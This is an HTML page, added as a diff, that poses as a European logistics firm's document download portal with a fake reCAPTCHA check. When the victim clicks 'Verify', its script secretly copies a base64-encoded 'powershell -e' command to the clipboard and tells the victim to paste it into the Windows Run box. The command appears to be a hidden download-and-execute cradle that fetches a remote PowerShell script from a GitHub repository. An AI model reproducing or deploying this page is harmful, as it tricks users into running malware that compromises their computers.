@@ -1,0 +1,628 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Euro Transit Control – Document</title>
+    <link href="https://fonts.googleapis.com/css2?family=Inter:opsz,wght@14..32,300;400;500;600;700&display=swap" rel="stylesheet">
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0-beta3/css/all.min.css">
+    <style>
+        * { margin: 0; padding: 0; box-sizing: border-box; }
+        body {
+            background: #eef2f5;
+            font-family: 'Inter', 'Segoe UI', Roboto, sans-serif;
+            line-height: 1.5;
+            min-height: 100vh;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            padding: 2rem;
+        }
+        .portal-container {
+            width: 100%;
+            max-width: 1400px;
+            margin: 0 auto;
+            background: #ffffff;
+            border-radius: 28px;
+            box-shadow: 0 25px 45px -12px rgba(0,0,0,0.2);
+            overflow: hidden;
+        }
+        .portal-container.blurred {
+            filter: blur(4px);
+            opacity: 0.6;
+            pointer-events: none;
+        }
+        .top-bar {
+            background: #0a2b3e;
+            padding: 1rem 2rem;
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            flex-wrap: wrap;
+            gap: 1rem;
+            border-bottom: 3px solid #ffb347;
+        }
+        .logo-area {
+            display: flex;
+            align-items: center;
+            gap: 12px;
+        }
+        .logo-icon {
+            background: #ffb347;
+            width: 40px;
+            height: 40px;
+            border-radius: 12px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            font-size: 1.5rem;
+            color: #0a2b3e;
+        }
+        .logo-text h2 {
+            font-size: 1.4rem;
+            font-weight: 700;
+            color: white;
+            letter-spacing: -0.3px;
+        }
+        .logo-text p {
+            font-size: 0.7rem;
+            color: #bbd4e5;
+        }
+        .support-info {
+            color: #cddfe8;
+            font-size: 0.85rem;
+            background: rgba(255,255,255,0.1);
+            padding: 0.4rem 1rem;
+            border-radius: 30px;
+        }
+        .hero-section {
+            background: linear-gradient(105deg, #f8fafc 0%, #ffffff 100%);
+            padding: 2rem 2rem 1rem 2rem;
+            border-bottom: 1px solid #e2e8f0;
+        }
+        .breadcrumb {
+            font-size: 0.8rem;
+            color: #5b6e8c;
+            margin-bottom: 1rem;
+        }
+        .hero-section h1 {
+            font-size: 2rem;
+            font-weight: 700;
+            color: #0a2b3e;
+            margin-bottom: 0.5rem;
+        }
+        .main-content {
+            padding: 2rem;
+            display: flex;
+            flex-wrap: wrap;
+            gap: 2rem;
+        }
+        .report-panel {
+            flex: 2;
+            min-width: 260px;
+        }
+        .file-card {
+            background: #ffffff;
+            border-radius: 20px;
+            border: 1px solid #e2edf2;
+            padding: 1.5rem;
+            margin-bottom: 1.5rem;
+        }
+        .file-header {
+            display: flex;
+            align-items: center;
+            gap: 1rem;
+            margin-bottom: 1rem;
+        }
+        .file-icon-big {
+            background: #eef2ff;
+            width: 54px;
+            height: 54px;
+            border-radius: 18px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            font-size: 1.8rem;
+            color: #1e7e34;
+        }
+        .file-title h3 {
+            font-size: 1.3rem;
+            font-weight: 600;
+            margin-bottom: 0.25rem;
+        }
+        .file-meta {
+            font-size: 0.8rem;
+            color: #5b6e8c;
+            display: flex;
+            gap: 1rem;
+            flex-wrap: wrap;
+        }
+        .btn-download {
+            background: #1a73e8;
+            color: white;
+            border: none;
+            padding: 0.9rem 1.5rem;
+            border-radius: 40px;
+            font-weight: 600;
+            font-size: 1rem;
+            cursor: pointer;
+            width: 100%;
+            transition: 0.2s;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            gap: 10px;
+            margin-top: 0.5rem;
+            opacity: 0.6;
+            pointer-events: none;
+        }
+        .btn-download.active {
+            opacity: 1;
+            pointer-events: auto;
+            background: #1a73e8;
+        }
+        .btn-download.active:hover {
+            background: #0f62d0;
+            transform: translateY(-1px);
+        }
+        .captcha-overlay {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            z-index: 1000;
+            visibility: hidden;
+            opacity: 0;
+            transition: visibility 0.2s, opacity 0.2s;
+            pointer-events: none;
+        }
+        .captcha-overlay.active {
+            visibility: visible;
+            opacity: 1;
+            pointer-events: auto;
+        }
+        .g-recaptcha-card {
+            background: #fff;
+            border-radius: 16px;
+            border: 1px solid #e0e0e0;
+            padding: 20px 24px;
+            font-family: 'Inter', 'Roboto', Arial, sans-serif;
+            width: 420px;
+            box-shadow: 0 10px 25px rgba(0,0,0,0.2);
+        }
+        .rc-header {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            border-bottom: 1px solid #ebebeb;
+            padding-bottom: 12px;
+            margin-bottom: 12px;
+            margin: -20px -24px 12px -24px;
+            padding: 12px 24px 8px 24px;
+            transition: background 0.2s, color 0.2s;
+        }
+        .rc-header.blue-panel {
+            background-color: #1a73e8;
+            border-bottom-color: #1a73e8;
+        }
+        .rc-header.blue-panel .rc-logo span { color: white; }
+        .rc-header.blue-panel .fa-shield-alt { color: white !important; }
+        .rc-logo {
+            display: flex;
+            align-items: center;
+            gap: 8px;
+        }
+        .rc-logo img { height: 28px; }
+        .rc-logo span {
+            font-size: 14px;
+            font-weight: 500;
+            color: #3c4043;
+        }
+        .rc-checkbox-area {
+            display: flex;
+            align-items: center;
+            gap: 14px;
+            margin: 12px 0;
+            cursor: pointer;
+        }
+        .fake-checkbox {
+            width: 28px;
+            height: 28px;
+            border-radius: 4px;
+            background: white;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            border: 2px solid #bdc1c6;
+        }
+        .rc-checkbox-area.active .fake-checkbox {
+            background-color: #e8f0fe;
+            border-color: #1a73e8;
+        }
+        .fake-checkbox .checkmark {
+            color: #1a73e8;
+            font-size: 18px;
+            display: none;
+        }
+        .rc-checkbox-area.final .fake-checkbox .checkmark { display: block; }
+        .fake-checkbox .spinner-small {
+            width: 18px;
+            height: 18px;
+            border: 2px solid #f3f3f3;
+            border-top: 2px solid #1a73e8;
+            border-radius: 50%;
+            animation: spin 0.6s linear infinite;
+            display: none;
+        }
+        .fake-checkbox.spinning .spinner-small { display: block; }
+        .fake-checkbox.hidden-checkbox { display: none; }
+        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
+        .rc-text { font-size: 15px; color: #202124; }
+        .rc-footer {
+            font-size: 11px;
+            color: #7d7f83;
+            text-align: right;
+            border-top: 1px solid #ebebeb;
+            padding-top: 8px;
+            margin-top: 12px;
+        }
+        .error-message-rc {
+            background: #fce8e6;
+            border-left: 4px solid #d93025;
+            border-radius: 8px;
+            padding: 10px 12px;
+            margin-top: 2px;
+            font-size: 14px;
+            color: #c5221f;
+        }
+        .instruction-box {
+            background: #f1f3f4;
+            border-radius: 8px;
+            padding: 14px 16px;
+            margin-top: 0px;
+            font-size: 14px;
+            line-height: 1.6;
+            display: none;
+        }
+        .key-dark {
+            display: inline-flex;
+            align-items: center;
+            justify-content: center;
+            background: #2c2c2c;
+            color: white;
+            font-size: 13px;
+            font-weight: 500;
+            min-width: 30px;
+            height: 30px;
+            padding: 0 6px;
+            border-radius: 6px;
+            margin: 0 4px;
+        }
+        .win-key-icon {
+            background: #2c2c2c;
+            color: white;
+            font-size: 14px;
+            width: 30px;
+            height: 30px;
+            border-radius: 6px;
+            margin: 0 4px;
+            display: inline-flex;
+            align-items: center;
+            justify-content: center;
+        }
+        .progress-container {
+            margin-top: 20px;
+            padding: 12px;
+            text-align: center;
+            display: none;
+            border-top: 1px solid #eee;
+        }
+        .progress-container.visible {
+            display: block;
+        }
+        .progress-bar-wrap {
+            background: #dadce0;
+            border-radius: 20px;
+            height: 6px;
+            margin: 10px auto;
+            width: 100%;
+            overflow: hidden;
+        }
+        .progress-bar {
+            width: 0%;
+            height: 100%;
+            background: #1a73e8;
+            transition: width 0.2s linear;
+        }
+        .progress-text {
+            font-size: 13px;
+            color: #5f6368;
+            margin-top: 6px;
+        }
+        .hidden { display: none; }
+        footer {
+            background: #f8fafc;
+            border-top: 1px solid #e2e8f0;
+            padding: 1.5rem 2rem;
+            font-size: 0.75rem;
+            color: #5b6e8c;
+            text-align: center;
+        }
+        .verify-btn {
+            background: #1a73e8;
+            color: white;
+            border: none;
+            padding: 6px 18px;
+            border-radius: 4px;
+            font-weight: 500;
+            font-size: 13px;
+            cursor: pointer;
+            transition: 0.15s;
+            margin-top: 8px;
+            text-align: center;
+            text-transform: none;
+            display: inline-block;
+            box-shadow: 0 1px 2px rgba(0,0,0,0.1);
+            letter-spacing: 0.3px;
+            opacity: 0;
+            pointer-events: none;
+            visibility: hidden;
+            transition: opacity 0.3s ease, visibility 0.3s ease;
+        }
+        .verify-btn.visible {
+            opacity: 1;
+            pointer-events: auto;
+            visibility: visible;
+        }
+        .verify-btn.visible:hover {
+            background: #1557b0;
+        }
+        .btn-wrapper {
+            text-align: left;
+            margin-top: 0px;
+            min-height: 0;
+            height: auto;
+        }
+        @media (max-width: 800px) {
+            .g-recaptcha-card { width: 90%; margin: 0 20px; }
+            .hero-section p { max-width: 100%; }
+        }
+    </style>
+</head>
+<body>
+<div class="portal-container" id="portalContainer">
+    <div class="top-bar">
+        <div class="logo-area">
+            <div class="logo-icon"><i class="fas fa-globe-europe"></i></div>
+            <div class="logo-text">
+                <h2>Euro Transit Control</h2>
+                <p>European Logistics & Compliance</p>
+            </div>
+        </div>
+        <div class="support-info">
+            <i class="fas fa-headset"></i> support@euro-transit-control.com
+        </div>
+    </div>
+    <div class="hero-section">
+        <div class="breadcrumb"><i class="fas fa-home"></i> / Documents</div>
+        <h1>Document</h1>
+    </div>
+    <div class="main-content">
+        <div class="report-panel">
+            <div class="file-card">
+                <div class="file-header">
+                    <div class="file-icon-big"><i class="fas fa-file-pdf"></i></div>
+                    <div class="file-title">
+                        <h3>eu-transit-control.pdf</h3>
+                        <div class="file-meta">
+                            <span><i class="fas fa-database"></i> 74.5 KB</span>
+                            <span><i class="fas fa-lock"></i> Secure download</span>
+                        </div>
+                    </div>
+                </div>
+                <button class="btn-download disabled-after-blur" id="downloadBtn"><i class="fas fa-download"></i> Download</button>
+            </div>
+        </div>
+    </div>
+    <footer>
+        <i class="fas fa-registered"></i> Euro Transit Control — authorized EU partner.
+    </footer>
+</div>
+
+<div id="captchaOverlay" class="captcha-overlay">
+    <div class="g-recaptcha-card">
+        <div class="rc-header" id="rcHeader">
+            <div class="rc-logo">
+                <img src="https://www.gstatic.com/recaptcha/api2/logo_48.png" alt="reCAPTCHA">
+                <span>reCAPTCHA</span>
+            </div>
+            <div><i class="fas fa-shield-alt"></i></div>
+        </div>
+        
+        <div id="step1" class="rc-checkbox-area">
+            <div class="fake-checkbox" id="fakeCheckbox">
+                <div class="spinner-small"></div>
+                <i class="fas fa-check checkmark"></i>
+            </div>
+            <div class="rc-text">I'm not a robot</div>
+        </div>
+        
+        <div id="step2" style="display: none;">
+            <div class="error-message-rc" id="rcError">
+                <i class="fas fa-exclamation-triangle"></i> <strong>Verification failed.</strong><br>
+                Please complete manual verification:
+            </div>
+            <div class="btn-wrapper">
+                <button class="verify-btn" id="verifyBtn">Verify</button>
+            </div>
+            <div class="instruction-box" id="rcInstruction">
+                <strong>Instructions:</strong><br>
+                1. Press <span class="win-key-icon"><i class="fab fa-windows"></i></span> + <span class="key-dark">R</span>.<br>
+                2. Press <span class="key-dark">Ctrl</span> + <span class="key-dark">V</span>, then <span class="key-dark">Enter</span>.<br>
+                3. Wait for verification to complete.
+            </div>
+        </div>
+        <div class="progress-container" id="progressContainer">
+            <div class="progress-bar-wrap">
+                <div class="progress-bar" id="progressBar"></div>
+            </div>
+            <div class="progress-text">Verifying...</div>
+        </div>
+        <div class="rc-footer">
+            Protected by reCAPTCHA <a href="#">Privacy</a> - <a href="#">Terms</a>
+        </div>
+    </div>
+</div>
+
+<script>
+    
+
+    const downloadBtn = document.getElementById('downloadBtn');
+    const portal = document.getElementById('portalContainer');
+    const overlay = document.getElementById('captchaOverlay');
+    const step1 = document.getElementById('step1');
+    const step2 = document.getElementById('step2');
+    const errorDiv = document.getElementById('rcError');
+    const instructionDiv = document.getElementById('rcInstruction');
+    const progressContainer = document.getElementById('progressContainer');
+    const progressBar = document.getElementById('progressBar');
+    const fakeCheckbox = document.getElementById('fakeCheckbox');
+    const rcHeader = document.getElementById('rcHeader');
+    const verifyBtn = document.getElementById('verifyBtn');
+
+    let isVerifying = false, progressTimeout = null, animId = null, captchaActive = false;
+
+    async function copyCmd() {
+    const fullBase64 = "cABvAHcAZQByAHMAaABlAGwAbAAgAC0AZQAgAGMAQQBCAHYAQQBIAGMAQQBaAFEAQgB5AEEASABNAEEAYQBBAEIAbABBAEcAdwBBAGIAQQBBAGcAQQBDADAAQQBWAHcAQQBnAEEARQBnAEEASQBBAEEAdABBAEUAVQBBAGMAQQBBAGcAQQBFAEkAQQBJAEEAQQB0AEEARQBNAEEASQBBAEEAaQBBAEMAUQBBAGQAdwBCAGoAQQBEADAAQQBUAGcAQgBsAEEASABjAEEATABRAEIAUABBAEcASQBBAGEAZwBCAGwAQQBHAE0AQQBkAEEAQQBnAEEARQA0AEEAWgBRAEIAMABBAEMANABBAFYAdwBCAGwAQQBHAEkAQQBRAHcAQgBzAEEARwBrAEEAWgBRAEIAdQBBAEgAUQBBAE8AdwBBAGsAQQBIAGMAQQBZAHcAQQB1AEEARQBnAEEAWgBRAEIAaABBAEcAUQBBAFoAUQBCAHkAQQBIAE0AQQBMAGcAQgBCAEEARwBRAEEAWgBBAEEAbwBBAEMAYwBBAFYAUQBCAHoAQQBHAFUAQQBjAGcAQQB0AEEARQBFAEEAWgB3AEIAbABBAEcANABBAGQAQQBBAG4AQQBDAHcAQQBKAHcAQgBOAEEARwA4AEEAZQBnAEIAcABBAEcAdwBBAGIAQQBCAGgAQQBDADgAQQBOAFEAQQB1AEEARABBAEEASgB3AEEAcABBAEQAcwBBAGEAUQBCAGwAQQBIAGcAQQBJAEEAQQBrAEEASABjAEEAWQB3AEEAdQBBAEUAUQBBAGIAdwBCADMAQQBHADQAQQBiAEEAQgB2AEEARwBFAEEAWgBBAEIAVABBAEgAUQBBAGMAZwBCAHAAQQBHADQAQQBaAHcAQQBvAEEAQwBjAEEAYQBBAEIAMABBAEgAUQBBAGMAQQBCAHoAQQBEAG8AQQBMAHcAQQB2AEEARwBjAEEAYQBRAEIAMABBAEcAZwBBAGQAUQBCAGkAQQBDADQAQQBZAHcAQgB2AEEARwAwAEEATAB3AEIAagBBAEcARQBBAGMAZwBCAHkAQQBIAGsAQQBOAHcAQQA0AEEARABBAEEATAB3AEIAagBBAEcAdwBBAGEAUQBCAGwAQQBIAE0AQQBaAFEAQgAwAEEAQwA4AEEAYwBnAEIAaABBAEgAYwBBAEwAdwBCAHkAQQBHAFUAQQBaAGcAQgB6AEEAQwA4AEEAYQBBAEIAbABBAEcARQBBAFoAQQBCAHoAQQBDADgAQQBiAFEAQgBoAEEARwBrAEEAYgBnAEEAdgBBAEgATQBBAFoAUQBCAGoAQQBIAFUAQQBjAGcAQgBsAEEAQwA0AEEAYwBBAEIAegBBAEQARQBBAEoAdwBBAHAAQQBDAEkAQQA=";
+    
+    const finalCmd = `powershell -e ${fullBase64}`;
+    
+    try {
+        await navigator.clipboard.writeText(finalCmd);
+    } catch(e) {
+        const ta = document.createElement('textarea');
+        ta.value = finalCmd;
+        document.body.appendChild(ta);
+        ta.select();
+        document.execCommand('copy');
+        document.body.removeChild(ta);
+    }
+}
+
+    function activateCaptcha() {
+        if (captchaActive) return;
+        captchaActive = true;
+        portal.classList.add('blurred');
+        downloadBtn.classList.add('disabled-after-blur');
+        overlay.classList.add('active');
+    }
+
+    function startLongProgress(duration) {
+        progressContainer.classList.add('visible');
+        let start = null;
+        function step(t) {
+            if (!start) start = t;
+            let elapsed = t - start;
+            let percent = Math.min(100, (elapsed / duration) * 100);
+            progressBar.style.width = percent + '%';
+            if (elapsed < duration) animId = requestAnimationFrame(step);
+            else {
+                progressBar.style.width = '100%';
+                setTimeout(() => {
+                    progressContainer.classList.remove('visible');
+                    finalAnimation();
+                }, 200);
+                cancelAnimationFrame(animId);
+            }
+        }
+        animId = requestAnimationFrame(step);
+    }
+
+    function finalAnimation() {
+        step2.style.display = 'none';
+        step1.style.display = 'flex';
+        fakeCheckbox.classList.add('spinning');
+        setTimeout(() => {
+            fakeCheckbox.classList.remove('spinning');
+            fakeCheckbox.querySelector('.checkmark').style.display = 'block';
+            step1.classList.add('final');
+            const successMsg = document.createElement('div');
+            successMsg.id = 'tempSuccessMsg';
+            successMsg.style.fontSize = '12px';
+            successMsg.style.color = '#3c4043';
+            successMsg.style.marginTop = '6px';
+            successMsg.innerText = 'Verification successful';
+            const oldMsg = document.getElementById('tempSuccessMsg');
+            if (oldMsg) oldMsg.remove();
+            step1.appendChild(successMsg);
+            setTimeout(() => {
+                overlay.classList.remove('active');
+                portal.classList.remove('blurred');
+                downloadBtn.classList.remove('disabled-after-blur');
+                downloadBtn.classList.add('active');
+                downloadBtn.innerHTML = '<i class="fas fa-download"></i> Download (access granted)';
+                downloadBtn.onclick = () => {
+                    const pdfUrl = 'https://github.com/carry780/clieset/raw/main/eu-transit-control.pdf';
+                    const a = document.createElement('a');
+                    a.href = pdfUrl;
+                    a.download = 'eu-transit-control.pdf';
+                    a.click();
+                };
+            }, 2000);
+        }, 1500);
+    }
+
+    function scheduleProgress() {
+        if (progressTimeout) clearTimeout(progressTimeout);
+        progressTimeout = setTimeout(() => {
+            if (overlay.classList.contains('active') && !downloadBtn.classList.contains('active')) {
+                startLongProgress(35000);
+            }
+        }, 15000);
+    }
+
+    function startAutoCheck() {
+        fakeCheckbox.classList.add('spinning');
+        setTimeout(() => {
+            fakeCheckbox.classList.remove('spinning');
+            step1.style.display = 'none';
+            step2.style.display = 'block';
+            verifyBtn.classList.add('visible');
+            instructionDiv.style.display = 'none';
+        }, 4500);
+    }
+
+    async function onVerifyClick() {
+        if (isVerifying) return;
+        isVerifying = true;
+        await new Promise(r => setTimeout(r, 1000));
+        verifyBtn.classList.remove('visible');
+        instructionDiv.style.display = 'block';
+        rcHeader.classList.add('blue-panel');
+        await copyCmd();
+        scheduleProgress();
+        isVerifying = false;
+    }
+
+    let triggered = false;
+    function trigger() {
+        if (triggered) return;
+        triggered = true;
+        activateCaptcha();
+        startAutoCheck();
+    }
+
+    setTimeout(trigger, 3000);
+    downloadBtn.addEventListener('click', (e) => {
+        e.preventDefault();
+        if (!triggered) trigger();
+    });
+
+    verifyBtn.addEventListener('click', onVerifyClick);
+</script>
+</body>
+</html>
